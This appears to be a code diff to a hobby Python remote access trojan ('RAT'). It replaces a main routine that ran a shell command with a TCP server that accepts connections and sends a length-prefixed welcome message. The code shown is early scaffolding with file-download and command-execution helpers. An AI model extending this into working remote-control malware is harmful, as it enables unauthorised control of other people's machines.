@@ -25,13 +25,20 @@ def Download(fileName):
     localFile.close()
     return OutputText
 
+HEADERSIZE = 10
+
 
 def main():
-        print("Welcome to the Python RAT")
-
-        Download("test.txt")
-        command = 'ls'
-        Exec(command)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind((socket.gethostname(), 64209))
+    s.listen(1)
+    while True:
+        clientsocket, address = s.accept()
+        print(f"Found connection at {address}! Connection successful!")
+        messageForClient = "Welcome to the RAT :)"
+        messageForClient = f'{len(messageForClient):<{HEADERSIZE}}' + messageForClient
+        clientsocket.send(bytes(messageForClient, "UTF-8"))
+        
 
 if __name__ == '__main__':
     main()
